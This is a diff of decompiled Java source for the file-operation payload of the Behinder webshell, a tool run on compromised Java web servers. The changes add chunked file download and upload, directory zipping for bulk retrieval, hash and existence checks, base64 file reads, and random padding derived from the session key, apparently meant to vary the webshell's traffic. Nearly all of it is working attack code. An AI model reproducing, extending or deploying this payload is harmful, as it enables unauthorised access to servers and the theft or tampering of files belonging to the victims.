@@ -1,14 +1,17 @@
 package net.rebeyond.behinder.payload.java;
 
-import java.io.BufferedReader;
+import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
-import java.io.InputStreamReader;
+import java.io.IOException;
 import java.lang.reflect.Method;
+import java.nio.ByteBuffer;
+import java.nio.channels.FileChannel;
 import java.nio.charset.Charset;
 import java.nio.file.LinkOption;
 import java.nio.file.Path;
+import java.security.MessageDigest;
 import java.text.DateFormat;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
@@ -18,7 +21,10 @@ import java.util.HashMap;
 import java.util.Iterator;
 import java.util.List;
 import java.util.Map;
+import java.util.Random;
 import java.util.Set;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipOutputStream;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 
@@ -28,6 +34,9 @@ public class FileOperation {
    public static String newPath;
    public static String content;
    public static String charset;
+   public static String hash;
+   public static String blockIndex;
+   public static String blockSize;
    public static String createTimeStamp;
    public static String modifyTimeStamp;
    public static String accessTimeStamp;
@@ -41,10 +50,10 @@ public class FileOperation {
       boolean var15 = false;
 
       boolean var3;
-      label164: {
+      label198: {
          Method write;
          Object so;
-         label165: {
+         label199: {
             try {
                var15 = true;
                this.fillContext(obj);
@@ -54,6 +63,10 @@ public class FileOperation {
                   var15 = false;
                } else if (mode.equalsIgnoreCase("show")) {
                   ((Map)result).put("msg", this.show());
+                  ((Map)result).put("status", "success");
+                  var15 = false;
+               } else if (mode.equalsIgnoreCase("checkExist")) {
+                  ((Map)result).put("msg", this.checkExist(path));
                   ((Map)result).put("status", "success");
                   var15 = false;
                } else if (mode.equalsIgnoreCase("delete")) {
@@ -67,12 +80,21 @@ public class FileOperation {
                   ((Map)result).put("msg", this.append());
                   ((Map)result).put("status", "success");
                   var15 = false;
+               } else if (mode.equalsIgnoreCase("update")) {
+                  this.updateFile();
+                  ((Map)result).put("msg", "ok");
+                  ((Map)result).put("status", "success");
+                  var15 = false;
+               } else if (mode.equalsIgnoreCase("downloadPart")) {
+                  ((Map)result).put("msg", this.downloadPart(path, Long.parseLong(blockIndex), Long.parseLong(blockSize)));
+                  ((Map)result).put("status", "success");
+                  var15 = false;
                } else {
                   if (mode.equalsIgnoreCase("download")) {
                      this.download();
                      var3 = true;
                      var15 = false;
-                     break label164;
+                     break label198;
                   }
 
                   if (mode.equalsIgnoreCase("rename")) {
@@ -80,6 +102,11 @@ public class FileOperation {
                      var15 = false;
                   } else if (mode.equalsIgnoreCase("createFile")) {
                      ((Map)result).put("msg", this.createFile());
+                     ((Map)result).put("status", "success");
+                     var15 = false;
+                  } else if (mode.equalsIgnoreCase("compress")) {
+                     zipFile(path, true);
+                     ((Map)result).put("msg", "ok");
                      ((Map)result).put("status", "success");
                      var15 = false;
                   } else if (mode.equalsIgnoreCase("createDirectory")) {
@@ -94,11 +121,15 @@ public class FileOperation {
                      ((Map)result).put("msg", this.updateTimeStamp());
                      ((Map)result).put("status", "success");
                      var15 = false;
+                  } else if (mode.equalsIgnoreCase("check")) {
+                     ((Map)result).put("msg", this.checkFileHash(path));
+                     ((Map)result).put("status", "success");
+                     var15 = false;
                   } else {
                      var15 = false;
                   }
                }
-               break label165;
+               break label199;
             } catch (Exception var20) {
                ((Map)result).put("msg", var20.getMessage());
                ((Map)result).put("status", "fail");
@@ -153,6 +184,47 @@ public class FileOperation {
       return var3;
    }
 
+   private String checkFileHash(String path) throws Exception {
+      FileChannel ch = (FileChannel)this.sessionGetAttribute(this.Session, path);
+      if (ch != null && ch.isOpen()) {
+         ch.close();
+      }
+
+      byte[] input = this.getFileData(path);
+      if (input != null && input.length != 0) {
+         MessageDigest md5 = MessageDigest.getInstance("MD5");
+         md5.update(input);
+         byte[] byteArray = md5.digest();
+         StringBuilder sb = new StringBuilder();
+         byte[] var7 = byteArray;
+         int var8 = byteArray.length;
+
+         for(int var9 = 0; var9 < var8; ++var9) {
+            byte b = var7[var9];
+            sb.append(String.format("%02x", b));
+         }
+
+         return sb.substring(0, 16);
+      } else {
+         return null;
+      }
+   }
+
+   private void updateFile() throws Exception {
+      FileChannel ch = (FileChannel)this.sessionGetAttribute(this.Session, path);
+      if (ch == null) {
+         FileOutputStream fos = new FileOutputStream(path);
+         ch = fos.getChannel();
+         this.sessionSetAttribute(this.Session, "fos", fos);
+         this.sessionSetAttribute(this.Session, path, ch);
+      }
+
+      synchronized(ch) {
+         ch.position((long)(Integer.parseInt(blockIndex) * Integer.parseInt(blockSize)));
+         ch.write(ByteBuffer.wrap(this.base64decode(content)));
+      }
+   }
+
    private Map warpFileObj(File file) {
       Map obj = new HashMap();
       obj.put("type", file.isDirectory() ? "directory" : "file");
@@ -166,6 +238,15 @@ public class FileOperation {
    private boolean isOldJava() {
       String version = System.getProperty("java.version");
       return version.compareTo("1.7") < 0;
+   }
+
+   private String checkExist(String path) throws Exception {
+      File file = new File(path);
+      if (file.exists()) {
+         return file.length() + "";
+      } else {
+         throw new Exception("");
+      }
    }
 
    private String getFilePerm(File file) {
@@ -219,26 +300,21 @@ public class FileOperation {
    }
 
    private String show() throws Exception {
-      if (charset == null) {
-         charset = System.getProperty("file.encoding");
+      byte[] fileContent = this.getFileData(path);
+      return base64encode(fileContent);
+   }
+
+   private byte[] getFileData(String path) throws IOException {
+      ByteArrayOutputStream output = new ByteArrayOutputStream();
+      FileInputStream fis = new FileInputStream(new File(path));
+      byte[] buffer = new byte[10240000];
+      int length = 0;
+      while((length = fis.read(buffer)) > 0) {
+         output.write(Arrays.copyOfRange(buffer, 0, length));
       }
 
-      StringBuffer sb = new StringBuffer();
-      File f = new File(path);
-      if (f.exists() && f.isFile()) {
-         InputStreamReader isr = new InputStreamReader(new FileInputStream(f), charset);
-         BufferedReader br = new BufferedReader(isr);
-         String str = null;
-
-         while((str = br.readLine()) != null) {
-            sb.append(str + "\n");
-         }
-
-         br.close();
-         isr.close();
-      }
-
-      return sb.toString();
+      fis.close();
+      return output.toByteArray();
    }
 
    private String create() throws Exception {
@@ -387,6 +463,88 @@ public class FileOperation {
       }
    }
 
+   private String downloadPart(String path, long blockIndex, long blockSize) throws Exception {
+      FileChannel ch = (FileChannel)this.sessionGetAttribute(this.Session, path);
+      if (ch == null) {
+         FileInputStream fis = new FileInputStream(path);
+         ch = fis.getChannel();
+         this.sessionSetAttribute(this.Session, "fis", fis);
+         this.sessionSetAttribute(this.Session, path, ch);
+      }
+
+      ByteBuffer buffer = ByteBuffer.allocate((int)blockSize);
+      int size;
+      synchronized(ch) {
+         ch.position(blockIndex * blockSize);
+         size = ch.read(buffer);
+      }
+
+      byte[] content = buffer.array();
+      return base64encode(Arrays.copyOfRange(content, 0, size));
+   }
+
+   private static void zipFile(String srcDir, boolean KeepDirStructure) throws Exception {
+      File file = new File(srcDir);
+      String fileName = file.getName();
+      FileOutputStream out = new FileOutputStream((new File(srcDir)).getParentFile().getAbsolutePath() + File.separator + fileName + ".zip");
+      long start = System.currentTimeMillis();
+      ZipOutputStream zos = null;
+
+      try {
+         zos = new ZipOutputStream(out);
+         File sourceFile = new File(srcDir);
+         compress(sourceFile, zos, sourceFile.getName(), KeepDirStructure);
+         long var9 = System.currentTimeMillis();
+      } catch (Exception var18) {
+         throw new RuntimeException("zip error from ZipUtils", var18);
+      } finally {
+         if (zos != null) {
+            try {
+               zos.close();
+            } catch (IOException var17) {
+               var17.printStackTrace();
+            }
+         }
+
+      }
+
+   }
+
+   private static void compress(File sourceFile, ZipOutputStream zos, String name, boolean KeepDirStructure) throws Exception {
+      byte[] buf = new byte[102400];
+      if (sourceFile.isFile()) {
+         zos.putNextEntry(new ZipEntry(name));
+         FileInputStream in = new FileInputStream(sourceFile);
+
+         int len;
+         while((len = in.read(buf)) != -1) {
+            zos.write(buf, 0, len);
+         }
+
+         zos.closeEntry();
+         in.close();
+      } else {
+         File[] listFiles = sourceFile.listFiles();
+         if (listFiles != null && listFiles.length != 0) {
+            File[] var11 = listFiles;
+            int var7 = listFiles.length;
+
+            for(int var8 = 0; var8 < var7; ++var8) {
+               File file = var11[var8];
+               if (KeepDirStructure) {
+                  compress(file, zos, name + "/" + file.getName(), KeepDirStructure);
+               } else {
+                  compress(file, zos, file.getName(), KeepDirStructure);
+               }
+            }
+         } else if (KeepDirStructure) {
+            zos.putNextEntry(new ZipEntry(name + "/"));
+            zos.closeEntry();
+         }
+      }
+
+   }
+
    private String buildJsonArray(List list, boolean encode) throws Exception {
       StringBuilder sb = new StringBuilder();
       sb.append("[");
@@ -474,6 +632,44 @@ public class FileOperation {
       return result;
    }
 
+   private static String base64encode(String content) throws Exception {
+      String result = "";
+      String version = System.getProperty("java.version");
+      Class Base64;
+      Object Encoder;
+      if (version.compareTo("1.9") >= 0) {
+         Base64 = Class.forName("java.util.Base64");
+         Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
+         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, content.getBytes("UTF-8"));
+      } else {
+         Base64 = Class.forName("sun.misc.BASE64Encoder");
+         Encoder = Base64.newInstance();
+         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, content.getBytes("UTF-8"));
+         result = result.replace("\n", "").replace("\r", "");
+      }
+
+      return result;
+   }
+
+   private static String base64encode(byte[] content) throws Exception {
+      String result = "";
+      String version = System.getProperty("java.version");
+      Class Base64;
+      Object Encoder;
+      if (version.compareTo("1.9") >= 0) {
+         Base64 = Class.forName("java.util.Base64");
+         Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
+         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, content);
+      } else {
+         Base64 = Class.forName("sun.misc.BASE64Encoder");
+         Encoder = Base64.newInstance();
+         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, content);
+         result = result.replace("\n", "").replace("\r", "");
+      }
+
+      return result;
+   }
+
    private void fillContext(Object obj) throws Exception {
       if (obj.getClass().getName().indexOf("PageContext") >= 0) {
          this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
@@ -487,5 +683,37 @@ public class FileOperation {
       }
 
       this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
+   }
+
+   private byte[] getMagic() throws Exception {
+      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
+      int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
+      Random random = new Random();
+      byte[] buf = new byte[magicNum];
+
+      for(int i = 0; i < buf.length; ++i) {
+         buf[i] = (byte)random.nextInt(256);
+      }
+
+      return buf;
+   }
+
+   private Object sessionGetAttribute(Object session, String key) {
+      Object result = null;
+
+      try {
+         result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
+      } catch (Exception var5) {
+      }
+
+      return result;
+   }
+
+   private void sessionSetAttribute(Object session, String key, Object value) {
+      try {
+         session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
+      } catch (Exception var5) {
+      }
+
    }
 }
